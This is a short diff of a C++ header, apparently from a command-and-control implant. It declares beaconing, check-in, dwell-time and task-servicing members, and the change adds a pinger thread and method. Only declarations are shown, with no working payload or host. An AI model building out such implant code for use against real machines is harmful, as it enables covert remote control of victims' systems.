@@ -19,8 +19,11 @@ struct Implant {
 	Implant(std::string host, std::string port, std::string uri);
 	// The thread for servicing tasks
 	std::future<void> taskThread;
+	// The thread for pinging
+	std::future<void> pingerThread;
 	// Our public functions that the implant exposes
 	void beacon();
+	void Pinger();
 	void beaconCheckIn(const char* url);
 	void setMeanDwell(double meanDwell);
 	void setRunning(bool isRunning);
